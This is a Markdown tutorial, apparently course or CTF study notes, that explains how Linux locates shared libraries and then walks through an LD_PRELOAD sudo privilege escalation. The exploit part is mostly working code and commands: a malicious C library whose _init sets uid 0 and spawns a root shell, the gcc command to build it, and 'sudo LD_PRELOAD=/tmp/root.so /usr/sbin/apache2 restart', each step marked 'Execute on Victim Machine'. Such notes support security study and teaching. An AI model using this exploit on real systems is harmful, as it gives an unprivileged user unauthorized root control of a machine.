# Shared Libraries

## What Are Shared Libraries?

Linux programs often use:

```text
shared libraries (.so files)
```

instead of including all code inside the program.

Purpose:

- reuse code
    
- reduce file size
    
- easier updates
    

---

# Types of Libraries

|Type|Extension|Behavior|
|---|---|---|
|Static Library|`.a`|Included permanently in binary|
|Dynamic/Shared Library|`.so`|Loaded during execution|

---

# Static Library

```text
Code becomes part of executable during compilation.
```

Characteristics:

- cannot easily modify later
    
- larger executable size
    

---

# Shared Library

```text
Loaded when program runs.
```

Characteristics:

- reusable
    
- smaller binaries
    
- can be replaced/hijacked
    

This is why shared libraries are important in privilege escalation.

---

# How Linux Finds Shared Libraries

Linux searches library paths using multiple methods.

---

## 1. `-rpath`

### Used During Compilation

Developer hardcodes library path.

Example:

```bash
gcc program.c -Wl,-rpath=/custom/path
```

Meaning:

```text
Always search this directory for libraries.
```

---

## 2. `LD_LIBRARY_PATH`

### Environment Variable

### Execute on Victim Machine

```bash
export LD_LIBRARY_PATH=/tmp/libs
```

Temporarily adds custom library search path.

---

## 3. Default Directories

Linux automatically checks:

```text
/lib
/usr/lib
```

---

## 4. `/etc/ld.so.conf`

Configuration file storing additional library directories.

### Execute on Victim Machine

```bash
cat /etc/ld.so.conf
```

---

# LD_PRELOAD

## Core Concept

```text
Force Linux to load attacker library BEFORE legitimate libraries.
```

This allows:

- overriding functions
    
- executing malicious code
    

---

# Important Behavior

Libraries loaded using:

```text
LD_PRELOAD
```

get priority over normal libraries.

---

# LD_PRELOAD Privilege Escalation

# Goal

```text
Execute attacker-controlled code as root.
```

---

# Required Conditions

|Requirement|Needed|
|---|---|
|sudo access|Yes|
|`env_keep+=LD_PRELOAD`|Yes|
|allowed sudo binary|Yes|

---

# Step 1 — Check Sudo Rights

### Execute on Victim Machine

```bash
sudo -l
```

---

# Critical Output

```text
env_keep+=LD_PRELOAD
```

Meaning:

```text
sudo preserves LD_PRELOAD variable.
```

Normally sudo removes dangerous environment variables.

---

# Allowed Root Command

```text
(root) NOPASSWD: /usr/sbin/apache2 restart
```

Meaning:

- apache restart can run as root
    
- no password needed
    

---

# Why This Is Dangerous

If:

- root program executes
    
- attacker controls loaded library
    

then:

- malicious code runs as root

# Malicious Shared Library

## Create Source File

### Execute on Victim Machine

```bash
nano root.c
```

---

# Code

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

---

# Code Explanation

|Code|Purpose|
|---|---|
|`_init()`|Executes automatically when library loads|
|`unsetenv()`|Remove LD_PRELOAD variable|
|`setuid(0)`|Become root|
|`setgid(0)`|Become root group|
|`system("/bin/bash")`|Spawn root shell|


---

# Step 2 — Compile Malicious Library

### Execute on Victim Machine

```bash
gcc -fPIC -shared -o root.so root.c -nostartfiles
```

---

# Compilation Flags

|Flag|Meaning|
|---|---|
|`-fPIC`|Position Independent Code|
|`-shared`|Create `.so` shared library|
|`-o root.so`|Output filename|
|`-nostartfiles`|Skip standard startup code|

---

# Output

Creates:

```text
root.so
```

malicious shared object.

---

# Step 3 — Execute Exploit

### Execute on Victim Machine

```bash
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
```

---

# Internal Execution Flow

```text
sudo runs apache as root
        ↓
Linux loads root.so first
        ↓
_init() executes automatically
        ↓
setuid(0)
        ↓
spawn root shell
```

---

# Step 4 — Verify Root Access

### Execute on Victim Machine

```bash
id
```

Expected:

```text
uid=0(root)
```
